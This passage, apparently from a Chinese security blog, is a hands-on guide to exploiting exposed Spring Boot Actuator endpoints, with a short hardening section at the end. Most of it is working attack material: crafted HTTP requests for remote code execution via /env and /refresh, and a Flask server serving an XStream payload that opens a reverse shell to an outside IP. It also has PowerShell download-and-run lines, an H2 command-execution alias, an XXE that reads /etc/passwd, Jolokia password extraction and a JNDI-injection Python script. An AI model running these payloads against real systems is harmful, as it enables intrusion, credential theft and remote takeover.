<td align="center">(修复错误和 bug 并再次发布的)正式发布版</td>
</tr>
</tbody></table>
<h3 id="服务特征"><a href="#服务特征" class="headerlink" title="服务特征"></a>服务特征</h3><p><strong>Spring Boot</strong></p>
<p>1.网站图片是一个绿色的树叶</p>
<p>2.报错信息</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsyyj2zpn7j60m805rmzu02.jpg" alt="Spring Boot识别.png"></p>
<p><strong>Actuator</strong> </p>
<p>Spring Boot 1.x 版本在跟目录下注册</p>
<p>Spring Boot 2.x版本端点移动到<code>/actuator/</code>路径</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>访问如下路径，敏感页面可直接访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/autoconfig - 显示自动配置报告</span><br><span class="line">/configprops - 显示配置属性</span><br><span class="line">/beans - 显示Spring Beans的完整列表</span><br><span class="line">/dump - 显示线程转储（包括堆栈跟踪）</span><br><span class="line">/env - 提供对配置环境的访问</span><br><span class="line">/health - 显示应用程序的健康指标</span><br><span class="line">/info - 显示应用信息</span><br><span class="line">/logfile - 输出日志文件的内容</span><br><span class="line">/mappings - 显示所有MVC控制器映射</span><br><span class="line">/metrics - 显示当前应用的’指标’信息</span><br><span class="line">/restart - 重新启动应用程序</span><br><span class="line">/shutdown - 关闭应用程序</span><br><span class="line">/trace - 显示最后几条HTTP消息（可能包含会话标识符）</span><br><span class="line">/jolokia/list - 存在logback组件，可执行远程代码</span><br></pre></td></tr></table></figure>



<h3 id="restart"><a href="#restart" class="headerlink" title="/restart"></a>/restart</h3><p>导致应用重启，影响业务正常运行</p>
<h3 id="shutdown"><a href="#shutdown" class="headerlink" title="/shutdown"></a>/shutdown</h3><p>导致应用关闭，影响业务正常运行</p>
<h3 id="env"><a href="#env" class="headerlink" title="/env"></a>/env</h3><p>环境信息泄露，可能存在数据库账号密码</p>
<p>存在软件的版本信息和绝对路径</p>
<p>查看是否存在常见的反序列化 gadget 依赖，比如 commons-collections、 Jdk7u21、 Jdk8u20 等</p>
<h4 id="spring-Cloud-env"><a href="#spring-Cloud-env" class="headerlink" title="spring Cloud env"></a>spring Cloud env</h4><p>当spring boot使用Spring Cloud 相关组件时，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE</p>
<p><strong>利用范围</strong></p>
<ul>
<li>Spring Boot 2.x 无法利用成功</li>
<li>Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功</li>
<li>Spring Boot &lt;= 1.4 可利用成功</li>
</ul>
<p>下载EXP</p>
<p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>将下载后的文件编译,然后把生成的jar文件上传到公网web服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>

<p>利用 /env endpoint 修改 spring.cloud.bootstrap.location 属性值为外部 yml 配置文件 url 地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"> </span><br><span class="line">spring.cloud.bootstrap.location=http://x.x.x.x/yaml-payload.yml</span><br></pre></td></tr></table></figure>

<p>在通过/refresh 接口触发</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>



<h4 id="XStream反序列化"><a href="#XStream反序列化" class="headerlink" title="XStream反序列化"></a>XStream反序列化</h4><p>影响范围</p>
<ul>
<li>Eureka-Client &lt;1.8.7</li>
</ul>
<p>查看/env端点是否存在<code>eureka.client.serviceUrl.defaultZone</code>属性</p>
<p>通过/env将<code>eureka.client.serviceUrl.defaultZone</code>属性设置为服务器URL，然后调用/refresh端点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1</span></span><br><span class="line"><span class="comment"># windows反弹shell</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powershell&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                                &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/88.88.88.88/3333 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">2222</span>)</span><br></pre></td></tr></table></figure>

<p>使用python在公网web服务器执行以上代码</p>
<p>spring 1.x（一定要指定内容类型，不能有其他类型）</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/json</span><br></pre></td></tr></table></figure>



<p>通过/env端点设置<code>eureka.client.serviceUrl.defaultZone</code>属性</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50</span><br><span class="line"> </span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://x.x.x.x/xstream</span><br></pre></td></tr></table></figure>

<p>访问/refresh端点刷新配置</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>



<h4 id="H2-REC"><a href="#H2-REC" class="headerlink" title="H2 REC"></a>H2 REC</h4><p>影响版本</p>
<ul>
<li>Spring Boot 2.x版本</li>
</ul>
<p>发送POST包配置<code>spring.datasource.hikari.connection-test-query</code>的值</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xx.xx.xx.xx:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json"><span class="attr">&quot;name&quot;</span>:<span class="string">&quot;spring.datasource.hikari.connection-test-query&quot;</span>,<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;; CALL EXEC(&#x27;ipconfig&amp;&amp;ifconfig&#x27;);&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问/refresh端点刷新配置</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/restart</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xx.xx.xx.xx:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>



<h4 id="MySQL-jdbc-反序列化"><a href="#MySQL-jdbc-反序列化" class="headerlink" title="MySQL jdbc 反序列化"></a>MySQL jdbc 反序列化</h4><p>1.查看环境依赖</p>
<p>在<code>/env</code>端点中查找<code>mysql-connector-java</code>依赖,并查看版本号（5.x或者8.x）</p>
<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 value 值，方便后续恢复其正常 jdbc url 值</p>
<p>2.在公网web服务器上运行python脚本</p>
<p><a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py</a></p>
<p>利用ysoserial生成 payload.ser 反序列化 payload 文件，供脚本使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure>

<p>3.设置 <code>spring.datasource.url</code> 属性</p>
<p>根据 /env 接口暴露的属性名 spring.datasource.url ，和实际的 mysql-connector-java 版本，设置 jdbc url</p>
<p>mysql-connector-java 5.x</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jdbc:</span><span class="symbol">mysql:</span>/<span class="regexp">/xx.xx.xx.xx:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="literal">false</span>&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>mysql-connector-java 8.x</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jdbc:</span><span class="symbol">mysql:</span>/<span class="regexp">/xx.xx.xx.xx:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="literal">false</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>spring boot 1.x</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure>

<p>spring boot 2.x</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>4.访问/refresh端点刷新配置</p>
<p>spring boot 1.x</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring boot 2.x</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/json</span><br></pre></td></tr></table></figure>

<p>5.触发数据查询，即可触发反序列化漏洞，反序列化漏洞利用完成后,恢复 <code>spring.datasource.url</code> 的原始 value 值</p>
<h3 id="mappings"><a href="#mappings" class="headerlink" title="/mappings"></a>/mappings</h3><p>获取应用所有接口列表，可能导致接口被恶意攻击，影响接口正常使用</p>
<p>可能存在未授权接口</p>
<h3 id="trace"><a href="#trace" class="headerlink" title="/trace"></a>/trace</h3><p>获取认证信息（Cookie、tooken、Session），利用认证信息访问接口，比如伪造cookie登录</p>
<h3 id="jolokia-list"><a href="#jolokia-list" class="headerlink" title="/jolokia/list"></a>/jolokia/list</h3><h4 id="调用-org-springframework-bootMbean"><a href="#调用-org-springframework-bootMbean" class="headerlink" title="调用 org.springframework.bootMbean"></a>调用 org.springframework.bootMbean</h4><p>通过<code>org.springframework.bootMbean</code>获取/env中被隐藏的账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<h4 id="调用-org-springframework-cloud-context-environmentMbean"><a href="#调用-org-springframework-cloud-context-environmentMbean" class="headerlink" title="调用 org.springframework.cloud.context.environmentMbean"></a>调用 org.springframework.cloud.context.environmentMbean</h4><p>通过<code>org.springframework.cloud.context.environmentMbean</code>获取/env中被隐藏的账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<h4 id="reloadByURL方法"><a href="#reloadByURL方法" class="headerlink" title="reloadByURL方法"></a>reloadByURL方法</h4><p>可能存在logback 库提供的reloadByURL方法</p>
<p>reloadByURL方法，允许远程加载logback.xml 配置文件，并且解析 xml 文件未做任何过滤措施，导致了xxe漏洞</p>
<p><strong>XXE漏洞实现</strong></p>
<p>创建<code>logback.xml</code>和<code>fileread.dtd</code>文件</p>
<p><code>logback.xml</code>中写入公网web服务器地址</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://x.x.x.x/fileread.dtd&quot;</span>&gt;</span>%remote;%int;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;trick;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>fileread.dtd</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>把创建的<code>logback.xml</code>和<code>fileread.dtd</code>文件上传到公网web服务器下</p>
<p>远程访问<code>logback.xml</code>文件，其中<code>www.xxx.com</code>是靶机的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http://x.x.x.x/logback.xml</span><br></pre></td></tr></table></figure>

<p>然后就可以成功通过XXE读取到etc/passwd文件内容</p>
<p><strong>RCE远程代码执行</strong></p>
<p>下载RCE代码</p>
<p><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p>
<p>修改<code>Spring-Boot-Actuator-Exploit\maliciousRMIServer\src\main\java\hello\EvilRMIServer.java</code>的代码</p>
<p>可以修改RMI远程监听的端口，和反弹shell的地址和端口</p>
<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt3c2guyqhj60xc0bs0zg02.jpg" alt="Spring Boot RCE.png"></p>
<p>利用maven对Java代码进行编译打包</p>
<p>进入<code>Spring-Boot-Actuator-Exploit\maliciousRMIServer</code>目录，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn clean install</span><br></pre></td></tr></table></figure>

<p>打包后创建target目录下生成<code>RMIServer-0.1.0.jar</code>文件</p>
<p>修改<code>logback.xml</code>的内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>把RMIServer-0.1.0.jar文件上传到公网web服务器上。<br>执行RMIServer-0.1.0.jar文件,开启攻击机上的RMI监听时需要通过<code>Djava.rmi.server.hostname=x.x.x.x</code>指定自己的RMI监听的外网地址</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-<span class="number">0.1</span><span class="number">.0</span>.jar</span><br></pre></td></tr></table></figure>

<p>使用NC监听反弹shell指定的窗口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>

<p>访问靶机url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http://x.x.x.x/logback.xml</span><br></pre></td></tr></table></figure>



<h4 id="createJNDIRealm方法"><a href="#createJNDIRealm方法" class="headerlink" title="createJNDIRealm方法"></a>createJNDIRealm方法</h4><p>查看<code>/jolokia/list</code>中存在的是否存在<code>org.apache.catalina.mbeans.MBeanFactory</code>类提供的<code>createJNDIRealm</code>方法，可能存在JNDI注入，导致远程代码执行</p>
<p>1、创建 JNDIRealm<br>2、写入 contextFactory 为 RegistryContextFactory<br>3、写入 connectionURL 为你的 RMI Service URL<br>4、停止 Realm<br>5、启动 Realm 以触发 JNDI 注入<br>可以使用burp一步步重放，也可以直接使用python脚本执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用jar包-RMIServer-0.1.0.jar，运行RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>使用NC监听反弹shell指定的窗口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>

<p>使用python发送请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python EXP.py http://x.x.x.x/</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.禁用<code>/actuator/</code>页面以及子路径，适用于spring 2.x</p>
<p>2.禁用所有接口，将配置改成<code>endpoints.enabled = false</code></p>
<p>3.在<code>pom.xml</code>引入<code>spring-boot-starter-security</code>依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>application.properties</code>中开启security功能，配置访问权限验证,然后重启生效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.port=8080</span><br><span class="line">management.security.enabled=true</span><br><span class="line">security.user.name=xxxxx</span><br><span class="line">security.user.password=xxxxxx</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>开发框架漏洞</category>
        <category>未授权访问漏洞</category>
        <category>Spring Boot</category>
      </categories>
      <tags>
        <tag>未授权访问漏洞</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Elasticsearch未授权访问</title>
    <url>//9db3aff65775.html</url>
